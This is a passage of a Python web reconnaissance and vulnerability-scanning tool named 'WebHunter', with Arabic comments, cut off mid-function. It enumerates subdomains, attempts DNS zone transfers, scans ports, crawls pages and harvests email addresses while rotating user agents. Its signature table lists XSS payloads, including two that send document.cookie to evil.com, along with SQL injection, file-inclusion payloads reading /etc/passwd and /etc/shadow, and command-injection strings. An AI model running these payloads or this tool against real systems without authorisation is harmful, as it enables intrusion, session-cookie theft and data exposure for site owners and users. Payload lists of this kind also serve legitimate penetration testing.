import os
import sys
import json
import re
import time
import socket
import ssl
import sqlite3
import random
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from collections import defaultdict
import requests
from bs4 import BeautifulSoup
import dns.resolver
import dns.zone
import dns.query
import whois
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
import threading
import queue
import concurrent.futures
import html
import xml.etree.ElementTree as ET

DB_FILE = 'webhunter_scans.db'
SETTINGS = {
    'ports_to_scan': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443],
    'request_delay': (0.5, 2.5),
    'request_timeout': 15,
    'crawl_max_pages': 75,
    'max_threads': 25,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0'
    ]
}

SUBDOMAIN_WORDLIST = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'api', 'blog', 'forum', 'dev', 'test', 'staging', 'admin', 'mysql', 'mssql', 'email', 'secure', 'shop', 'cart', 'app', 'mobile', 'static', 'beta', 'demo', 'cp', 'portal', 'support', 'live', 'news', 'media', 'cdn', 'files', 'download', 'images', 'img', 'assets', 'public', 'private', 'remote', 'm', 'mail2', 'ns3', 'ns4', 'ns5', 'ns6', 'ns7', 'ns8', 'ns9', 'ns10', 'ns11', 'ns12', 'ns13', 'ns14', 'ns15', 'exchange', 'vpn', 'sftp', 'dns', 'help', 'docs', 'doc', 'wiki', 'crm', 'erp', 'store', 'vps', 'server', 'ns', 'pop3', 'imap', 'sql', 'db', 'database', 'host', 'hosting', 'ssl', 'apps', 'git', 'ci', 'upload', 'uploads', 'backup', 'backups', 'log', 'logs', 'tmp', 'temp', 'cache', 'development', 'uat', 'prod', 'production', 'old', 'new', 'legacy', 'alpha', 'testing', 'internal', 'intranet', 'extranet', 'web', 'www2', 'www1', 'touch', 'wap', 'wireless', '3g', '4g', '5g', 'sms', 'mms', 'fax', 'tel', 'sip', 'voip', 'pbx', 'call', 'phone', 'contact', 'service', 'services', 'customer', 'clients', 'partners', 'suppliers', 'vendors', 'investors', 'careers', 'jobs', 'about', 'team', 'company', 'corporate', 'legal', 'privacy', 'terms', 'policy', 'faq', 'search', 'sitemap', 'rss', 'atom', 'feed', 'subscribe', 'newsletter', 'login', 'signin', 'register', 'signup', 'join', 'member', 'profile', 'account', 'settings', 'preferences', 'dashboard', 'home', 'index', 'default', 'main', 'welcome', 'intro', 'landing', 'splash', 'coming-soon', 'maintenance', 'error', '404', '500', '503', 'forbidden', 'access-denied', 'unauthorized', 'no-permission', 'redirect', 'goto', 'url', 'link', 'out', 'away', 'exit', 'click', 'track', 'pixel', 'beacon', 'analytics', 'stats', 'metrics', 'report', 'audit', 'monitor', 'health', 'status', 'ping', 'traceroute', 'whois', 'dns', 'lookup', 'query', 'find', 'explore', 'discover', 'browse', 'surf', 'navigate', 'guide', 'directory', 'catalog', 'list', 'archive', 'library', 'museum', 'gallery', 'collection', 'repository', 'storage', 'vault', 'safe', 'locker', 'box', 'folder', 'path', 'route', 'way', 'channel', 'stream', 'pipe', 'tube', 'wire', 'cable', 'fiber', 'optic', 'laser', 'radio', 'wave', 'signal', 'frequency', 'band', 'spectrum', 'bandwidth', 'throughput', 'speed', 'latency', 'jitter', 'packet', 'frame', 'datagram', 'segment', 'message', 'request', 'response', 'header', 'body', 'payload', 'data', 'content', 'file', 'document', 'image', 'video', 'audio', 'music', 'movie', 'clip', 'track', 'song', 'album', 'playlist', 'channel', 'show', 'episode', 'season', 'series', 'film', 'documentary', 'animation', 'cartoon', 'comic', 'manga', 'anime', 'game', 'play', 'sport', 'match', 'player', 'score', 'rank', 'leaderboard', 'tournament', 'league', 'cup', 'championship', 'world', 'cup', 'olympics', 'paralympics', 'commonwealth', 'pan-american', 'asian', 'african', 'european', 'mediterranean', 'pacific', 'indian', 'atlantic', 'arctic', 'antarctic', 'southern', 'northern', 'eastern', 'western', 'central', 'north', 'south', 'east', 'west', 'up', 'down', 'left', 'right', 'top', 'bottom', 'front', 'back', 'inside', 'outside', 'above', 'below', 'under', 'over', 'between', 'among', 'through', 'across', 'around', 'about', 'before', 'after', 'during', 'since', 'until', 'till', 'to', 'from', 'of', 'off', 'on', 'in', 'at', 'by', 'for', 'with', 'without', 'against', 'upon', 'per', 'via', 'vs', 'versus', 'de', 'da', 'del', 'della', 'van', 'von', 'le', 'la', 'les', 'du', 'des', 'der', 'den']

SIGNATURES = {
    'xss_payloads': [
        "<script>alert('XSS')</script>", "';alert('XSS');//", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')>", "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>", "<details open ontoggle=alert('XSS')>", "javascript:alert('XSS')", "<script>alert(document.domain)</script>", "<script>alert(document.cookie)</script>", "<script>location='http://evil.com/?c='+document.cookie</script>", "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", "<script>alertXSS</script>", "<script>alert&#x28;XSS&#x29;</script>", "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "<style>@import 'javascript:alert(1)';</style>", "<table background=\"javascript:alert(1)\"><tr><td>test</td></tr></table>", "<object data=\"javascript:alert(1)\">", "<embed src=\"javascript:alert(1)\">"
    ],
    'sqli_payloads': [
        "'", "''", "\"", "\"\"", "\\", "\\\\", "/", "//", "--", "#", ";", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR '1'='1' /", "\" OR \"1\"=\"1\" /", " OR 1=1--", " OR 1=1#", " OR 1=1/", "') OR '1'='1--", "\") OR \"1\"=\"1--", "admin'--", "admin'#", "admin'/", "' or 1=1--", "\" or 1=1--", "' or 1=1#", "\" or 1=1#", "') or ('1'='1--", "') or ('1'='1'#", "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' ORDER BY 4--", "1' ORDER BY 5--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL, NULL--", "1' UNION SELECT NULL, NULL, NULL--", "1' UNION SELECT NULL, NULL, NULL, NULL--", "1' UNION SELECT NULL, NULL, NULL, NULL, NULL--", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM sysobjects)>0--", "1' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "1' AND pg_sleep(5)--", "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)||CHR(68),5)--"
    ],
    'lfi_payloads': [
        "../../../etc/passwd", "..\\..\\..\\..\\..\\..\\..\\boot.ini", "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00", "/etc/shadow%00", "c:\\windows\\system32\\drivers\\etc\\hosts%00", "/proc/self/environ%00", "/var/log/apache2/access.log%00", "/var/log/httpd/access_log%00", "php://filter/read=convert.base64-encode/resource=index.php", "php://filter/convert.base64-encode/resource=config.php", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "expect://id", "zip://shell.zip%23shell.php", "phar://shell.phar/shell.php"
    ],
    'rce_payloads': [
        "; ls -la", "| ls -la", "& ls -la", "ls -la", "`ls -la`", "(ls -la)", "; id", "| id", "& id", "`id`", "(id)", "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd", "cat /etc/passwd", "`cat /etc/passwd`", "(cat /etc/passwd)", "; ping -c 10 127.0.0.1", "| ping -c 10 127.0.0.1", "& ping -c 10 127.0.0.1", "`ping -c 10 127.0.0.1`", "(ping -c 10 127.0.0.1)", "; nslookup google.com", "| nslookup google.com", "& nslookup google.com", "nslookup google.com", "$(nslookup google.com)"
    ],
    'sensitive_files': [
        '.env', '.htaccess', '.htpasswd', 'config.php', 'config.inc.php', 'configuration.php', 'conf.php', 'settings.php', 'db.php', 'database.php', 'connect.php', 'wp-config.php', 'config.xml', 'web.config', 'application.ini', 'config.yml', 'config.yaml', 'database.yml', 'settings.yml', 'settings.yaml', 'backup.sql', 'backup.zip', 'backup.tar.gz', 'dump.sql', 'db_dump.sql', 'database.sql', 'site.sql', 'wordpress.sql', 'joomla.sql', 'drupal.sql', 'phpinfo.php', 'info.php', 'test.php', 'admin.php', 'administrator/', 'admin/', 'phpmyadmin/', 'mysql/', 'panel/', 'cpanel/', 'webmail/', 'install/', 'setup/', 'upgrade/', 'logs/', 'error.log', 'access.log', 'cron.log', 'mail.log', 'security.log', 'debug.log', 'id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys', '.bash_history', '.mysql_history', 'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml', '.DS_Store', 'Thumbs.db', 'composer.json', 'package.json', 'Gemfile', 'Pipfile', 'requirements.txt', 'Dockerfile', 'docker-compose.yml', '.git/', '.git/config', '.svn/', '.hg/'
    ],
    'tech_signatures': {
        'WordPress': {'headers': {}, 'html': [r'wp-content', r'wp-includes', r'wp-json'], 'meta': {'generator': r'WordPress ([0-9.]+)'}},
        'Joomla': {'headers': {}, 'html': [r'/media/jui', r'com_content'], 'meta': {'generator': r'Joomla!'}},
        'Drupal': {'headers': {}, 'html': [r'Drupal.settings', r'sites/all'], 'meta': {'generator': r'Drupal ([0-9.]+)'}},
        'Magento': {'headers': {}, 'html': [r'skin/frontend', r'Mage.Cookies'], 'meta': {}},
        'Shopify': {'headers': {'X-Shopify-Stage': ''}, 'html': [r'cdn.shopify.com'], 'meta': {}},
        'Apache': {'headers': {'Server': r'Apache/([0-9.]+)'}, 'html': [], 'meta': {}},
        'Nginx': {'headers': {'Server': r'nginx/([0-9.]+)'}, 'html': [], 'meta': {}},
        'IIS': {'headers': {'Server': r'Microsoft-IIS/([0-9.]+)'}, 'html': [], 'meta': {}},
        'Cloudflare': {'headers': {'Server': r'cloudflare'}, 'html': [], 'meta': {}},
        'jQuery': {'headers': {}, 'html': [r'jquery-([0-9.]+).js'], 'script': [r'jquery'], 'meta': {}},
        'Bootstrap': {'headers': {}, 'html': [r'bootstrap-([0-9.]+).css', r'bootstrap-([0-9.]+).js'], 'script': [r'bootstrap'], 'meta': {}},
        'React': {'headers': {}, 'html': [r'react-dom.production.min.js'], 'script': [r'react'], 'meta': {}},
        'Angular': {'headers': {}, 'html': [r'ng-app'], 'script': [r'angular'], 'meta': {}},
        'Vue.js': {'headers': {}, 'html': [r'vue.js', r'vue.min.js'], 'script': [r'vue'], 'meta': {}},
        'PHP': {'headers': {'X-Powered-By': r'PHP/([0-9.]+)'}, 'html': [], 'meta': {}},
        'ASP.NET': {'headers': {'X-Powered-By': r'ASP.NET', 'X-AspNet-Version': ''}, 'html': [], 'meta': {}},
        'Google Analytics': {'headers': {}, 'html': [r'google-analytics.com/analytics.js'], 'script': [r'ga'], 'meta': {}}
    }
}

def clear_screen():
    """مسح الشاشة بناءً على نظام التشغيل"""
    os.system('cls' if os.name == 'nt' else 'clear')

def setup_database():
    """إعداد قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS scans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        results TEXT NOT NULL
    )
    ''')
    conn.commit()
    conn.close()

def get_random_user_agent():
    """الحصول على وكيل مستخدم عشوائي"""
    return random.choice(SETTINGS['user_agents'])

def get_random_delay():
    """الحصول على تأخير عشوائي بين الطلبات"""
    return random.uniform(*SETTINGS['request_delay'])

class WebHunter:
    def __init__(self, target_url, console):
        self.target_url = target_url.rstrip('/')
        self.target_domain = urlparse(self.target_url).netloc
        self.base_domain = self.target_domain.split('.')[-2] + '.' + self.target_domain.split('.')[-1] if len(self.target_domain.split('.')) > 1 else self.target_domain
        self.console = console
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': get_random_user_agent()})
        self.results = {
            'target': self.target_url,
            'domain': self.target_domain,
            'base_domain': self.base_domain,
            'timestamp': datetime.now().isoformat(),
            'info': {},
            'dns_records': {},
            'whois': {},
            'ssl': {},
            'technologies': [],
            'subdomains': set(),
            'open_ports': {},
            'crawl_data': {'urls': set(), 'forms': [], 'emails': set(), 'comments': []},
            'vulnerabilities': {'high': [], 'medium': [], 'low': []},
            'sensitive_files': [],
            'seo': {},
            'robots_txt': {},
            'sitemap_xml': {},
            'csrf_tokens': {},
            'login_pages': [],
            'backup_files': [],
            'config_files': [],
            'exposed_documents': []
        }
        self.crawled_urls = set()
        self.url_queue = queue.Queue()
        self.lock = threading.Lock()

    def _request(self, method, url, **kwargs):
        """إرسال طلب HTTP مع معالجة الأخطاء"""
        try:
            time.sleep(get_random_delay())
            response = self.session.request(method, url, timeout=SETTINGS['request_timeout'], allow_redirects=True, **kwargs)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            return None

    def gather_info(self):
        """جمع المعلومات الأساسية عن الهدف"""
        self.console.print(f"[bold cyan][+][/bold cyan] Gathering basic information for {self.target_domain}")
        self.results['info']['ip'] = self._get_ip()
        self.results['info']['http_status'] = self._request('GET', self.target_url).status_code if self._request('GET', self.target_url) else 'Error'
        self.results['info']['title'] = self._get_title()
        self.results['info']['server'] = self._get_server_info()
        self.results['info']['powered_by'] = self._get_powered_by()
        self.console.print(f"[green][+][/green] Basic info gathered.")

    def _get_ip(self):
        """الحصول على عنوان IP للنطاق"""
        try:
            return socket.gethostbyname(self.target_domain)
        except socket.gaierror:
            return "N/A"

    def _get_title(self):
        """الحصول على عنوان الصفحة"""
        try:
            response = self._request('GET', self.target_url)
            if response:
                soup = BeautifulSoup(response.text, 'html.parser')
                if soup.title and soup.title.string:
                    return soup.title.string.strip()
        except Exception:
            pass
        return "N/A"

    def _get_server_info(self):
        """الحصول على معلومات الخادم"""
        try:
            response = self._request('GET', self.target_url)
            if response and 'Server' in response.headers:
                return response.headers['Server']
        except Exception:
            pass
        return "N/A"

    def _get_powered_by(self):
        """الحصول على معلومات التقنيات المستخدمة"""
        try:
            response = self._request('GET', self.target_url)
            if response and 'X-Powered-By' in response.headers:
                return response.headers['X-Powered-By']
        except Exception:
            pass
        return "N/A"

    def analyze_dns(self):
        """تحليل سجلات DNS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Analyzing DNS records for {self.target_domain}")
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']

        # استخدام DNS مخصص إذا فشل DNS الافتراضي
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']  # Google DNS و Cloudflare DNS

            for rtype in record_types:
                try:
                    answers = resolver.resolve(self.target_domain, rtype)
                    self.results['dns_records'][rtype] = [str(rdata) for rdata in answers]
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
                    self.results['dns_records'][rtype] = []
        except Exception as e:
            self.console.print(f"[red][-][/red] DNS analysis failed: {str(e)}")
            for rtype in record_types:
                self.results['dns_records'][rtype] = []

        self.console.print(f"[green][+][/green] DNS analysis complete.")

    def analyze_whois(self):
        """تحليل معلومات WHOIS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Performing WHOIS lookup for {self.base_domain}")
        try:
            w = whois.whois(self.base_domain)
            
            # تخزين جميع البيانات المتاحة من WHOIS
            self.results['whois'] = {}
            
            # معلومات التسجيل الأساسية
            self.results['whois']['domain_name'] = w.domain_name
            self.results['whois']['registrar'] = w.registrar
            self.results['whois']['whois_server'] = w.whois_server
            self.results['whois']['referral_url'] = w.referral_url
            
            # تواريخ مهمة
            self.results['whois']['updated_date'] = w.updated_date.isoformat() if w.updated_date else 'N/A'
            self.results['whois']['creation_date'] = w.creation_date.isoformat() if w.creation_date else 'N/A'
            self.results['whois']['expiration_date'] = w.expiration_date.isoformat() if w.expiration_date else 'N/A'
            
            # معلومات المالك
            self.results['whois']['name'] = w.name
            self.results['whois']['org'] = w.org
            self.results['whois']['address'] = w.address
            self.results['whois']['city'] = w.city
            self.results['whois']['state'] = w.state
            self.results['whois']['zipcode'] = w.zipcode
            self.results['whois']['country'] = w.country
            
            # معلومات الاتصال
            self.results['whois']['email'] = w.emails
            self.results['whois']['phone'] = w.phone
            self.results['whois']['fax'] = w.fax
            
            # خوادم الأسماء
            self.results['whois']['name_servers'] = w.name_servers
            
            # حالة النطاق
            self.results['whois']['status'] = w.status
            
            # معلومات DNSSEC
            self.results['whois']['dnssec'] = w.dnssec if hasattr(w, 'dnssec') else 'N/A'
            
            # حجم النطاق
            self.results['whois']['domain_length'] = len(self.base_domain)
            
            # عمر النطاق بالأيام
            if w.creation_date:
                if isinstance(w.creation_date, list):
                    creation_date = w.creation_date[0]
                else:
                    creation_date = w.creation_date
                age_days = (datetime.now() - creation_date).days
                self.results['whois']['domain_age_days'] = age_days
                self.results['whois']['domain_age_years'] = round(age_days / 365, 1)
            
            # أيام حتى انتهاء الصلاحية
            if w.expiration_date:
                if isinstance(w.expiration_date, list):
                    expiration_date = w.expiration_date[0]
                else:
                    expiration_date = w.expiration_date
                days_until_expiry = (expiration_date - datetime.now()).days
                self.results['whois']['days_until_expiry'] = days_until_expiry
                
        except Exception as e:
            self.results['whois'] = {'error': str(e)}
        self.console.print(f"[green][+][/green] WHOIS lookup complete.")

    def analyze_ssl(self):
        """تحليل شهادة SSL/TLS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Analyzing SSL/TLS certificate for {self.target_domain}")
        try:
            hostname = self.target_domain
            port = 443
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=SETTINGS['request_timeout']) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    self.results['ssl'] = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter'],
                        'subject_alt_name': cert.get('subjectAltName', []),
                        'cipher': ssock.cipher()
                    }
        except Exception as e:
            self.results['ssl'] = {'error': str(e)}
        self.console.print(f"[green][+][/green] SSL/TLS analysis complete.")

    def detect_technologies(self):
        """كشف التقنيات المستخدمة في الموقع"""
        self.console.print(f"[bold cyan][+][/bold cyan] Detecting web technologies for {self.target_url}")
        response = self._request('GET', self.target_url)
        if not response:
            return
        headers = response.headers
        html_content = response.text
        soup = BeautifulSoup(html_content, 'html.parser')

        detected = set()
        for tech, sigs in SIGNATURES['tech_signatures'].items():
            if 'headers' in sigs:
                for header, pattern in sigs['headers'].items():
                    if header in headers:
                        if pattern and re.search(pattern, headers[header], re.I):
                            detected.add(f"{tech} ({headers[header]})")
                        elif not pattern:
                            detected.add(tech)
            if 'html' in sigs:
                for pattern in sigs['html']:
                    if re.search(pattern, html_content, re.I):
                        detected.add(tech)
            if 'meta' in sigs:
                for meta_tag, pattern in sigs['meta'].items():
                    meta_tag_content = soup.find('meta', attrs={'name': meta_tag})
                    if meta_tag_content and meta_tag_content.get('content'):
                        if re.search(pattern, meta_tag_content['content'], re.I):
                            detected.add(f"{tech} ({meta_tag_content['content']})")
            if 'script' in sigs:
                for pattern in sigs['script']:
                    scripts = soup.find_all('script', src=True)
                    for script in scripts:
                        if re.search(pattern, script['src'], re.I):
                            detected.add(tech)

        self.results['technologies'] = sorted(list(detected))
        self.console.print(f"[green][+][/green] Technology detection complete.")

    def find_subdomains_bruteforce(self):
        """البحث عن النطاقات الفرعية بالقوة الغاشمة"""
        self.console.print(f"[bold cyan][+][/bold cyan] Starting subdomain brute-force for {self.base_domain}")
        found_subdomains = set()

        def check_subdomain(sub):
            full_domain = f"{sub}.{self.base_domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                with self.lock:
                    found_subdomains.add(full_domain)
            except socket.gaierror:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=SETTINGS['max_threads']) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in SUBDOMAIN_WORDLIST]
            for future in concurrent.futures.as_completed(futures):
                pass

        self.results['subdomains'] = sorted(list(found_subdomains))
        self.console.print(f"[green][+][/green] Subdomain brute-force complete. Found {len(self.results['subdomains'])} subdomains.")
    
    def find_subdomains_certificate_transparency(self):
        """البحث عن النطاقات الفرعية عبر سجلات الشفافية للشهادات"""
        self.console.print(f"[bold cyan][+][/bold cyan] Searching subdomains via Certificate Transparency logs for {self.base_domain}")
        found_subdomains = set()
        
        try:
            # استخدام crt.sh API للبحث عن النطاقات الفرعية
            url = f"https://crt.sh/?q=%.{self.base_domain}&output=json"
            response = self._request('GET', url)
            
            if response:
                try:
                    certificates = response.json()
                    for cert in certificates:
                        name_value = cert.get('name_value', '')
                        # قد تحتوي قيمة الاسم على عدة نطاقات مفصولة بأسطر جديدة
                        subdomains = name_value.split('\n')
                        for subdomain in subdomains:
                            subdomain = subdomain.strip()
                            # التحقق من أن النطاق الفرعي ينتمي إلى النطاق الأساسي
                            if subdomain.endswith(self.base_domain) and subdomain != self.base_domain:
                                found_subdomains.add(subdomain)
                except json.JSONDecodeError:
                    self.console.print("[yellow][-][/yellow] Failed to parse Certificate Transparency logs")
        except Exception as e:
            self.console.print(f"[red][-][/red] Certificate Transparency search failed: {str(e)}")
        
        self.results['subdomains'].update(found_subdomains)
        self.results['subdomains'] = sorted(list(self.results['subdomains']))
        self.console.print(f"[green][+][/green] Certificate Transparency search complete. Found {len(found_subdomains)} additional subdomains.")
    
    def find_subdomains_dns_enum(self):
        """البحث عن النطاقات الفرعية عبر تعداد DNS"""
        self.console.print(f"[bold cyan][+][/bold cyan] Enumerating subdomains via DNS for {self.base_domain}")
        found_subdomains = set()
        
        try:
            # الحصول على سجلات NS
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']
            
            try:
                ns_records = resolver.resolve(self.base_domain, 'NS')
                ns_servers = [str(ns) for ns in ns_records]
                
                # محاولة نقل منطقة DNS
                for ns in ns_servers:
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(ns, self.base_domain))
                        if zone:
                            for name, node in zone.nodes.items():
                                if name.to_text():
                                    full_domain = f"{name.to_text()}.{self.base_domain}"
                                    found_subdomains.add(full_domain)
                    except:
                        continue
            except:
                pass
            
            # البحث عن سجلات AXFR (نقل منطقة DNS)
            try:
                axfr_records = resolver.resolve(self.base_domain, 'AXFR')
                for record in axfr_records:
                    if record.to_text().endswith(self.base_domain):
                        found_subdomains.add(record.to_text())
            except:
                pass
            
            # البحث عن سجلات TXT التي قد تحتوي على معلومات عن النطاقات الفرعية
            try:
                txt_records = resolver.resolve(self.base_domain, 'TXT')
                for txt in txt_records:
                    txt_content = str(txt)
                    # البحث عن نطاقات فرعية في سجلات TXT
                    subdomains = re.findall(r'([a-zA-Z0-9-]+\.' + re.escape(self.base_domain) + r')', txt_content)
                    for subdomain in subdomains:
                        found_subdomains.add(subdomain)
            except:
                pass
                
        except Exception as e:
            self.console.print(f"[red][-][/red] DNS enumeration failed: {str(e)}")
        
        self.results['subdomains'].update(found_subdomains)
        self.results['subdomains'] = sorted(list(self.results['subdomains']))
        self.console.print(f"[green][+][/green] DNS enumeration complete. Found {len(found_subdomains)} additional subdomains.")
    
    def find_subdomains_search_engines(self):
        """البحث عن النطاقات الفرعية عبر محركات البحث"""
        self.console.print(f"[bold cyan][+][/bold cyan] Searching subdomains via search engines for {self.base_domain}")
        found_subdomains = set()
        
        try:
            # استخدام Bing API للبحث عن النطاقات الفرعية
            bing_query = f"site:{self.base_domain} -site:www.{self.base_domain}"
            bing_url = f"https://www.bing.com/search?q={bing_query}&count=50"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            response = requests.get(bing_url, headers=headers)
            if response.status_code == 200:
                # استخراج النطاقات الفرعية من نتائج البحث
                subdomains = re.findall(r'https?://([a-zA-Z0-9-]+\.' + re.escape(self.base_domain) + r')', response.text)
                for subdomain in subdomains:
                    found_subdomains.add(subdomain)
        except Exception as e:
            self.console.print(f"[red][-][/red] Search engine enumeration failed: {str(e)}")
        
        self.results['subdomains'].update(found_subdomains)
        self.results['subdomains'] = sorted(list(self.results['subdomains']))
        self.console.print(f"[green][+][/green] Search engine enumeration complete. Found {len(found_subdomains)} additional subdomains.")

    def scan_ports(self):
        """فحص المنافذ المفتوحة"""
        self.console.print(f"[bold cyan][+][/bold cyan] Starting port scan on {self.results['info']['ip']}")
        open_ports = {}
        target_ip = self.results['info']['ip']
        if target_ip == "N/A":
            self.console.print("[red][-][/red] Cannot scan ports, IP address not found.")
            return

        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except OSError:
                    service = "unknown"
                with self.lock:
                    open_ports[port] = service
            sock.close()

        with concurrent.futures.ThreadPoolExecutor(max_workers=SETTINGS['max_threads']) as executor:
            futures = [executor.submit(scan_port, p) for p in SETTINGS['ports_to_scan']]
            for future in concurrent.futures.as_completed(futures):
                pass

        self.results['open_ports'] = dict(sorted(open_ports.items()))
        self.console.print(f"[green][+][/green] Port scan complete. Found {len(self.results['open_ports'])} open ports.")

    def crawl_site(self):
        """زحف الموقع لجمع المعلومات"""
        self.console.print(f"[bold cyan][+][/bold cyan] Crawling {self.target_url} (max {SETTINGS['crawl_max_pages']} pages)")
        self.url_queue.put(self.target_url)
        self.crawled_urls.add(self.target_url)

        def worker():
            while not self.url_queue.empty() and len(self.crawled_urls) < SETTINGS['crawl_max_pages']:
                url = self.url_queue.get()
                response = self._request('GET', url)
                if not response:
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')

                # جمع الروابط
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    if urlparse(full_url).netloc == self.target_domain and full_url not in self.crawled_urls:
                        with self.lock:
                            self.crawled_urls.add(full_url)
                            self.url_queue.put(full_url)
                            self.results['crawl_data']['urls'].add(full_url)

                # جمع النماذج
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    full_action = urljoin(url, action)
                    inputs = [(inp.get('name'), inp.get('type', 'text')) for inp in form.find_all('input')]
                    with self.lock:
                        self.results['crawl_data']['forms'].append({'url': full_action, 'method': method, 'inputs': inputs})

                # جمع التعليقات
                for comment in soup.find_all(string=lambda text: isinstance(text, type(soup.string)) and text.strip().startswith('<!--')):
                    with self.lock:
                        self.results['crawl_data']['comments'].append(comment.strip())

                # جمع عناوين البريد الإلكتروني
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
                with self.lock:
                    self.results['crawl_data']['emails'].update(emails)

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(worker) for _ in range(10)]
            for future in concurrent.futures.as_completed(futures):
                pass

        self.results['crawl_data']['urls'] = list(self.results['crawl_data']['urls'])
        self.results['crawl_data']['emails'] = list(self.results['crawl_data']['emails'])
        self.console.print(f"[green][+][/green] Crawling complete. Found {len(self.results['crawl_data']['urls'])} URLs, {len(self.results['crawl_data']['forms'])} forms, and {len(self.results['crawl_data']['emails'])} emails.")

    def analyze_robots_txt(self):
        """تحليل ملف robots.txt"""
        self.console.print(f"[bold cyan][+][/bold cyan] Analyzing robots.txt for {self.target_url}")
        robots_url = urljoin(self.target_url, '/robots.txt')
        response = self._request('GET', robots_url)

        if response and response.status_code == 200:
            content = response.text
            self.results['robots_txt'] = {
                'url': robots_url,
                'content': content,
                'disallowed_paths': [],
                'allowed_paths': []
            }

            # استخراج المسارات الممنوعة والمسموحة
            lines = content.split('\n')
            for line in lines:
                line = line.strip()
                if line.startswith('Disallow:'):
                    path = line.replace('Disallow:', '').strip()
                    if path:
                        self.results['robots_txt']['disallowed_paths'].append(path)
                elif line.startswith('Allow:'):
                    path = line.replace('Allow:', '').strip()
                    if path:
                        self.results['robots_txt']['allowed_paths'].append(path)

            self.console.print(f"[green][+][/green] robots.txt analysis complete. Found {len(self.results['robots_txt']['disallowed_paths'])} disallowed paths and {len(self.results['robots_txt']['allowed_paths'])} allowed paths.")
        else:
            self.results['robots_txt'] = {'error': 'robots.txt not found or inaccessible'}
            self.console.print(f"[yellow][-][/yellow] robots.txt not found or inaccessible.")

    def analyze_sitemap_xml(self):
        """تحليل ملف sitemap.xml"""
